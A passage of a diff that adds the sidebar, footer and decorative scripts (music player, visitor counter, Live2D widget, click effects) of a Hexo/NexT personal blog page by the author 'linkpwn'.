+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/linkpwn" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:dkj20060328@qq.com" title="E-Mail → mailto:dkj20060328@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/linkpwn" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">linkpwn</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/clickshowtext.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
